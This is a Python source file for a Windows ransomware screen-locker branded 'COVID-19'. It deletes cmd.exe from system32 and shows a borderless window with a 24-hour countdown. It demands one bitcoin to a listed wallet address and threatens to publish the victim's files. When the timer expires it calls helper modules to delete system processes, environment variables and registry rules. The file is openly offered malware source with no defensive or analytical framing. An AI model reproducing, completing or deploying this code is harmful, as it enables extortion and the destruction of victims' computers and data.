#!/usr/bin/python
#coding:utf-8
from tkinter import *
from PIL import ImageTk, Image
from timeit import default_timer
import tkinter as tk
import os, time, sys, timeps, subprocess
from modules.system import regedit, killproc, delproc
# REMOVE ORIGINAL CMD
try:
    os.remove("\\windows\\system32\\cmd.exe")
except FileNotFoundError:
    pass
# ENVIRONMENT VARIABLE TO USE
d = os.environ["SystemDrive"]
usr = os.environ["USERNAME"]
# INIT WINDOW FOR GUI COUNTER
window = Tk()
src = "\\Users\\{}\\AppData\\gui_counter\\db.txt".format(usr)
# FUNCTION TO SET A TIME
def updateTime(generator):
    global p
    p = next(generator)
    canvas.itemconfigure(text_clock, text=p, font=(None, 35))
    window.after(1000, updateTime, generator)
    with open(src, "w") as db:
        db.write(p)
    x = open(src).read()
    if(x == "00:00:00"):
        # Here instruction to destroyed the system ...
        delproc.exp()
        regedit.delenv()
        regedit.delSpecRules()
        exit()
# INSTRUCTION MESSAGE
def instructions():
    txt = tk.Label(font="bold", text="\nYour computer it's locked by the Ransomware COVID-19\n\n \
    For unlock to computer,\n \
    You have 24 HOURS to buy 1 bitcoin and transfert it at this address :\n\n \
    34YVap4JyjiBTWvy6Qobmni1k3tHbdi8UEL")
    txt.pack()
# WARNING MESSAGE
def warning():
    wrn = tk.Label(font="bold", text="Warning !!!\n \
    Restarting is useless\n\n \
    If you reboot the computer, the timer restart with 12 hours of less...\n\
    If you don't pay, all your sensitive files will be resold and publicate.\n")
    wrn.pack()
# BUTTON FUNCTION (work in progress...)
def pay_to_decrypt():
    btn1 = tk.Button(window, text="Decrypt your files", font="bold", fg="red", bg="black")
    btn1.pack(side=tk.BOTTOM)
    btn2 = tk.Button(window, text="Pay the Ransom", font="bold", fg="red", bg="black")
    btn2.pack(side=tk.BOTTOM)
# INSTRUCTION to desactived the header who contains the resize, minimize and exit window
window.overrideredirect(1)
canvas = Canvas(window, width=200, height=100, bg="red")
canvas.pack()
text_clock = canvas.create_text(100, 50)
# FUNCTION TO CONTROL IF DB.txt EXIST
try:
    with open(src, "r") as db:
        db = db.read()
        db = db.split(":")
        hours = int(db[0])
        minutes = int(db[1])
        secondes = int(db[2])
        updateTime(timeps.set_time(hours, minutes, secondes))
except FileNotFoundError:
    with open(src, "w") as db:
        updateTime(timeps.set_time(24, 0, 0))
except:
    with open(src, "w") as db:
        updateTime(timeps.set_time(12, 0, 0))
try:
    a = "{}\\Users\\{}\\AppData\\gui_counter\\image.jpg".format(d, usr)
    # SET IMAGE INTO WINDOW
    img = ImageTk.PhotoImage(Image.open(a))
    panel = tk.Label(window, image = img)
    panel.pack(side = "top", fill = "both", expand = "yes")
except FileNotFoundError:
    pass
# CALL EVERY FUNCTION INTO WINDOW
instructions()
warning()
pay_to_decrypt()
window.mainloop()